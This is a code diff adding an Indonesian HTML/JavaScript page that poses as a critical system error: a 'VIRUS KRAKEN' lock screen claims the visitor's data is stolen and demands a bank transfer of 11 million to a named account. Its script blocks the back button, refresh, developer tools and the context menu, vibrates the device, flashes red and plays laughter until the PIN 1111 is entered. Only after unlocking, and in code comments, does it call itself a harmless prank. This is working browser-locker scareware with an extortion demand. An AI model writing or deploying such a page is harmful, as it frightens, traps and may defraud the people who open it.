@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔒 KRITIKAL SYSTEM ERROR 🔒</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: black;
+            font-family: 'Courier New', 'Creepster', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        /* Overlay virus */
+        .virus-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, #3a0000, #1a0000);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 1.5rem;
+            backdrop-filter: blur(6px);
+            border-left: 25px solid #90EE90;   /* hijau muda di samping kiri */
+            border-right: 25px solid #90EE90;  /* hijau muda di samping kanan */
+            animation: bgShake 0.12s infinite;
+        }
+
+        @keyframes bgShake {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 2% 2%; }
+        }
+
+        /* Efek darah menetes */
+        .blood-drip {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(139,0,0,0.25) 0px, rgba(139,0,0,0.25) 3px, transparent 3px, transparent 10px);
+            pointer-events: none;
+            z-index: 15000;
+            animation: dripMove 0.6s linear infinite;
+        }
+
+        @keyframes dripMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 20px; }
+        }
+
+        /* Glitch teks utama */
+        .glitch-title {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #ff1111;
+            text-shadow: 4px 4px 0 #8b0000, -3px -3px 0 #ff6666;
+            animation: glitchText 0.1s infinite;
+            letter-spacing: 4px;
+            margin-bottom: 20px;
+        }
+
+        @keyframes glitchText {
+            0% { transform: skew(0deg); text-shadow: 3px 3px 0 red; }
+            90% { transform: skew(0deg); }
+            92% { transform: skew(10deg, 4deg); text-shadow: -4px -4px 0 #ff4444; }
+            94% { transform: skew(-8deg, -3deg); }
+            96% { transform: skew(3deg, 2deg); }
+            100% { transform: skew(0deg); }
+        }
+
+        /* Tulisan bergerak */
+        .marquee {
+            background: #000000aa;
+            color: #ffaa00;
+            font-size: 1.2rem;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 30px;
+            margin: 10px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            box-shadow: 0 0 15px red;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        .marquee span {
+            display: inline-block;
+            animation: scrollText 8s linear infinite;
+        }
+
+        @keyframes scrollText {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* Kartu peringatan */
+        .card-warning {
+            background: #000000cc;
+            backdrop-filter: blur(15px);
+            border: 3px solid #ff0000;
+            border-radius: 35px;
+            padding: 1.5rem;
+            max-width: 500px;
+            width: 90%;
+            margin: 15px auto;
+            box-shadow: 0 0 70px rgba(255,0,0,0.7);
+        }
+
+        .warning-message {
+            font-size: 1rem;
+            color: #ffaaaa;
+            background: #2a0000;
+            padding: 12px;
+            border-radius: 20px;
+            margin: 15px 0;
+            border-left: 8px solid #ff0000;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .pin-container {
+            background: #0a0a0a;
+            border: 2px solid #ff3333;
+            border-radius: 60px;
+            padding: 12px;
+            width: 260px;
+            margin: 20px auto;
+        }
+
+        .pin-input {
+            background: transparent;
+            border: none;
+            color: #ff6666;
+            font-size: 2rem;
+            text-align: center;
+            width: 100%;
+            font-family: monospace;
+            letter-spacing: 12px;
+            outline: none;
+        }
+
+        button {
+            background: #2a0000;
+            border: 2px solid #ff3333;
+            color: #ff9999;
+            padding: 12px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.05s linear;
+        }
+
+        button:active {
+            transform: scale(0.95);
+            background: #660000;
+        }
+
+        .error-msg {
+            color: #ff8888;
+            font-size: 0.75rem;
+            margin-top: 10px;
+        }
+
+        .timer-lock {
+            font-size: 1rem;
+            color: #ffaa66;
+            background: #1a0000;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 30px;
+            margin-top: 10px;
+        }
+
+        /* Efek flash merah */
+        .flash-red {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ff0000;
+            z-index: 30000;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.05s;
+        }
+    </style>
+</head>
+<body>
+
+<div class="virus-overlay" id="virusScreen">
+    <div class="glitch-title">!!! VIRUS KRAKEN AKTIF !!!</div>
+    <div class="marquee"><span>SALAM DARI KAISAR ☠️👑 SALAM DARI KAISAR ☠️👑</span></div>
+    <div class="card-warning">
+        <div class="warning-message">
+            ⚠️ <strong>PERANGKAT TERKUNCI PERMANEN ☠️</strong><br>
+            Data² anda kami curi ☠️<br>
+            Jika ingin bebas dari web ini TF gua 11jt YA ANAK KONT**<br>
+            <span style="font-size:0.8rem;">Bank: 085194279722 (AN. KAISAR)</span>
+        </div>
+        <div class="pin-container">
+            <input type="password" id="pinUnlock" class="pin-input" maxlength="4" inputmode="numeric" placeholder="****">
+        </div>
+        <button id="unlockBtn">⚡ BUKA KUNCI ⚡</button>
+        <div id="errorMsg" class="error-msg"></div>
+        <div id="lockTimerText" class="timer-lock">🔒 SISTEM TERKUNCI 🔒</div>
+    </div>
+</div>
+
+<div class="blood-drip"></div>
+<div class="flash-red" id="flashRed"></div>
+
+<script>
+    (function() {
+        // ========== PRANK VIRUS - AMAN, TIDAK MERUSAK ==========
+        let isUnlocked = false;
+        let exitBlocked = true;      // Blokir keluar selama 30 detik
+        let blockTimer = null;
+        let soundInterval = null;
+        let audioCtx = null;
+        let isSoundPlaying = false;
+        let flashInterval = null;
+        let vibrationInterval = null;
+        
+        const virusScreen = document.getElementById('virusScreen');
+        const pinInput = document.getElementById('pinUnlock');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const errorMsgDiv = document.getElementById('errorMsg');
+        const lockTimerText = document.getElementById('lockTimerText');
+        const flashRed = document.getElementById('flashRed');
+        
+        const CORRECT_PIN = "1111";
+        let secondsLeft = 30;   // 30 detik tidak bisa keluar
+        
+        // === 1. SUARA TAWA "HA HA HAHAHA HAHAHAHAHAHA HAHAHA" SETIAP 1.2 DETIK ===
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            return audioCtx;
+        }
+        
+        function playLaughSound() {
+            if (!isSoundPlaying || isUnlocked) return;
+            const ctx = initAudio();
+            if (ctx.state !== 'running') return;
+            const now = ctx.currentTime;
+            
+            // Buat suara tawa dengan 4 oscillator yang naik turun
+            for (let i = 0; i < 4; i++) {
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = i % 2 === 0 ? 'sawtooth' : 'square';
+                let freq = 300 + i * 50 + Math.random() * 30;
+                osc.frequency.value = freq;
+                gain.gain.value = 0.12;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.frequency.exponentialRampToValueAtTime(freq * 1.8, now + 0.2);
+                osc.frequency.exponentialRampToValueAtTime(freq * 0.6, now + 0.55);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
+                osc.stop(now + 0.8);
+            }
+            // Efek "HA HA HAHAHA" khusus
+            const laughOsc = ctx.createOscillator();
+            const laughGain = ctx.createGain();
+            laughOsc.type = 'triangle';
+            laughOsc.frequency.value = 420;
+            laughGain.gain.value = 0.1;
+            laughOsc.connect(laughGain);
+            laughGain.connect(ctx.destination);
+            laughOsc.start();
+            laughOsc.frequency.exponentialRampToValueAtTime(580, now + 0.2);
+            laughOsc.frequency.exponentialRampToValueAtTime(340, now + 0.5);
+            laughGain.gain.exponentialRampToValueAtTime(0.0001, now + 0.7);
+            laughOsc.stop(now + 0.7);
+        }
+        
+        function startLaughLoop() {
+            if (isSoundPlaying) return;
+            isSoundPlaying = true;
+            const ctx = initAudio();
+            ctx.resume().then(() => {
+                soundInterval = setInterval(() => {
+                    if (isSoundPlaying && !isUnlocked) {
+                        playLaughSound();
+                        // Tambahan tawa cepat kadang-kadang
+                        if (Math.random() > 0.6) {
+                            setTimeout(() => playLaughSound(), 200);
+                        }
+                    }
+                }, 1200); // setiap 1.2 detik
+            }).catch(e => console.log);
+        }
+        
+        function stopLaugh() {
+            if (soundInterval) clearInterval(soundInterval);
+            isSoundPlaying = false;
+        }
+        
+        // === 2. EFEK FLASH MERAH BERKALA ===
+        function startRedFlash() {
+            flashInterval = setInterval(() => {
+                if (!isUnlocked) {
+                    flashRed.style.opacity = "0.8";
+                    setTimeout(() => { flashRed.style.opacity = "0"; }, 300);
+                }
+            }, 4000);
+        }
+        
+        // === 3. GETARAN HP ===
+        function startVibration() {
+            if (!navigator.vibrate) return;
+            vibrationInterval = setInterval(() => {
+                if (!isUnlocked) {
+                    navigator.vibrate([300, 150, 400]);
+                }
+            }, 3500);
+        }
+        
+        // === 4. BLOKIR KELUAR SELAMA 30 DETIK (back, refresh, close) ===
+        function blockExitFor30Seconds() {
+            // Push state berlapis
+            for (let i = 0; i < 20; i++) history.pushState(null, null, location.href);
+            
+            window.addEventListener('popstate', function popHandler(e) {
+                if (exitBlocked && !isUnlocked) {
+                    for (let i = 0; i < 30; i++) history.pushState(null, null, location.href);
+                    // Tampilkan peringatan palsu
+                    const div = document.createElement('div');
+                    div.innerText = "⚠️ AKSES DITOLAK - PERANGKAT TERKUNCI ⚠️";
+                    div.style.position = "fixed";
+                    div.style.bottom = "20px";
+                    div.style.left = "20px";
+                    div.style.background = "red";
+                    div.style.color = "black";
+                    div.style.padding = "8px";
+                    div.style.zIndex = "99999";
+                    div.style.fontSize = "12px";
+                    div.style.borderRadius = "20px";
+                    document.body.appendChild(div);
+                    setTimeout(() => div.remove(), 1500);
+                } else if (!isUnlocked) {
+                    // setelah 30 detik tetap blokir sampai PIN
+                    for (let i = 0; i < 30; i++) history.pushState(null, null, location.href);
+                }
+            });
+            
+            window.addEventListener('beforeunload', (e) => {
+                if (!isUnlocked) {
+                    e.preventDefault();
+                    e.returnValue = 'PERANGKAT TERKUNCI! Jangan keluar!';
+                    return '';
+                }
+            });
+            
+            document.addEventListener('keydown', (e) => {
+                if ((e.ctrlKey && (e.key === 'r' || e.key === 'R')) || e.key === 'F5') {
+                    if (!isUnlocked) e.preventDefault();
+                }
+                if (e.key === 'F12') e.preventDefault();
+            });
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            // Timer 30 detik untuk melepas blokir (tapi tetap butuh PIN)
+            let timeLeft = 30;
+            lockTimerText.innerText = `🔒 TERKUNCI - ${timeLeft} DETIK TIDAK BISA KELUAR 🔒`;
+            blockTimer = setInterval(() => {
+                if (isUnlocked) {
+                    clearInterval(blockTimer);
+                    return;
+                }
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(blockTimer);
+                    exitBlocked = false;
+                    lockTimerText.innerText = "⚠️ SEKARANG ANDA BISA MASUKKAN PIN ⚠️";
+                    // Setelah 30 detik, kita tetap blokir back tapi tanpa timer, tetap butuh PIN
+                } else {
+                    lockTimerText.innerText = `🔒 TERKUNCI - ${timeLeft} DETIK TIDAK BISA KELUAR 🔒`;
+                }
+            }, 1000);
+        }
+        
+        // === 5. UNLOCK (PIN 1111) ===
+        function unlockDevice() {
+            if (isUnlocked) return;
+            isUnlocked = true;
+            // Hentikan semua efek
+            if (soundInterval) clearInterval(soundInterval);
+            if (flashInterval) clearInterval(flashInterval);
+            if (vibrationInterval) clearInterval(vibrationInterval);
+            if (blockTimer) clearInterval(blockTimer);
+            stopLaugh();
+            if (navigator.vibrate) navigator.vibrate(0);
+            // Matikan flash
+            flashRed.style.opacity = "0";
+            // Tampilkan pesan sukses
+            virusScreen.innerHTML = `
+                <div style="background: #0f0f0f; padding: 2rem; border-radius: 30px; text-align: center; animation: fadeIn 0.5s;">
+                    <div style="font-size: 4rem;">🔓✅</div>
+                    <h2 style="color: #0f0;">PERANGKAT TERBUKA</h2>
+                    <p style="color: #ccc;">PIN benar. Perangkat Anda aman.</p>
+                    <p style="color: #ffaa66;">Ini hanya simulasi. Tidak ada data yang dicuri.</p>
+                    <button id="exitNow" style="background: green; border: none; margin-top: 20px;">KELUAR</button>
+                </div>
+            `;
+            document.getElementById('exitNow').addEventListener('click', () => {
+                window.location.reload();
+            });
+        }
+        
+        // Cek PIN
+        function checkPin() {
+            if (isUnlocked) return;
+            const pin = pinInput.value.trim();
+            if (pin === CORRECT_PIN) {
+                unlockDevice();
+            } else {
+                errorMsgDiv.innerText = "❌ PIN SALAH! PERCOBAAN GAGAL. SISTEM TETAP TERKUNCI ❌";
+                pinInput.value = "";
+                pinInput.focus();
+                if (navigator.vibrate) navigator.vibrate([400, 200, 400]);
+                // Mainkan suara tawa tambahan
+                if (audioCtx && isSoundPlaying) playLaughSound();
+                // Flash merah sebentar
+                flashRed.style.opacity = "0.9";
+                setTimeout(() => { if (!isUnlocked) flashRed.style.opacity = "0"; }, 400);
+            }
+        }
+        
+        // === 6. MEMULAI SEMUA ===
+        function initVirus() {
+            blockExitFor30Seconds();
+            startRedFlash();
+            startVibration();
+            // Suara dimulai setelah user berinteraksi (klik pertama)
+            let audioStarted = false;
+            function startAudioOnUser() {
+                if (audioStarted) return;
+                audioStarted = true;
+                startLaughLoop();
+                document.removeEventListener('click', startAudioOnUser);
+                document.removeEventListener('touchstart', startAudioOnUser);
+            }
+            document.addEventListener('click', startAudioOnUser);
+            document.addEventListener('touchstart', startAudioOnUser);
+            
+            unlockBtn.addEventListener('click', checkPin);
+            pinInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') checkPin();
+            });
+            // Auto-check saat 4 digit
+            pinInput.addEventListener('input', () => {
+                if (pinInput.value.length === 4 && pinInput.value !== CORRECT_PIN) {
+                    setTimeout(() => checkPin(), 50);
+                } else if (pinInput.value.length === 4 && pinInput.value === CORRECT_PIN) {
+                    unlockDevice();
+                }
+            });
+        }
+        
+        initVirus();
+        
+        console.log("%c⚠️ PRANK VIRUS - AMAN, HANYA SIMULASI ⚠️", "color: red; font-size: 14px; background: black;");
+    })();
+</script>
+</body>
+</html>
